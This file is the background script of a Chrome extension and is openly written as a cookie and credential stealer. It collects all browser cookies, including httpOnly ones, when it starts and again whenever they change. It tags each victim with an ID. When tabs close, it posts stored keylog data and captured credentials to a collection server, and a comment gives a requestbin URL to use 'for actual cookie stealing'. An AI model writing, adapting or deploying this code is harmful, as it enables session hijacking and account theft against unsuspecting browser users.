/*
 * replace URL with requestbin for actual cookie stealing
 * https://en974z7hs59e3gc.m.pipedream.net/
 */
const BACKEND = "http://localhost:6900";

/*
 * incremental cookie dump
 */
chrome.cookies.onChanged.addListener((event) => {
  // if its removed, ignore
  if (event.removed) return;
  console.log(event.cookie);
  send([event.cookie], "cookie");
});

/*
 * no cookies are safe, even httpOnly, sameSite, Secure types
 * This is the initial cookie dump
 */
chrome.cookies.getAll({}, (r) => {
  console.log(r);
  send(r, "cookie");
});

function send(data, where) {
  fetch(`${BACKEND}/${where}`, {
    method: "POST",
    body: JSON.stringify({ data }),
    headers: {
      UID: `${UID}`,
      "content-type": "application/json",
    },
  }).catch((err) => {
    console.warn(err);
  });
}

// userID
let UID;
chrome.storage.local.get(["UID"], (res) => {
  if (JSON.stringify(res) === "{}") {
    let newUID = makeID();
    chrome.storage.local.set({ UID: `${newUID}` }, () => {});
    UID = newUID;
  } else UID = res.UID;
  // better implementation: get UID from server,
  // prevent randoms from flooding server with junk
});

let urls = [];
chrome.tabs.onUpdated.addListener((tabId, changeInfo, _) => {
  if (changeInfo.url) {
    const { origin } = new URL(changeInfo.url);
    console.log("Updated origin: ", origin);
    urls[tabId] = origin;
  }
});

chrome.tabs.onCreated.addListener((tab) => {
    const { origin } = new URL(tab.url);
    console.log("Created origin: ", origin);
    urls[tab.id] = origin;
});

// post to server on tab close
chrome.tabs.onRemoved.addListener((tabId, _) => {
  chrome.storage.local.get(["database"], (items) => {
    send(items, "keylog");
    console.log(items);
    let db = items.database;
    let origin = urls[tabId];
    console.log("origin == ", origin);
    db[origin] = "";
    chrome.storage.local.set({database: db})
  });
  chrome.storage.local.get(["credentials"], (items) => {
    send(items, "credentials");
    console.log("creds: ", items);
  })
});

// from: https://stackoverflow.com/a/1349426
function makeID() {
  const MAX_LEN = 10;
  var result = "";
  var characters =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  var charactersLength = characters.length;
  for (var i = 0; i < MAX_LEN; i++) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}
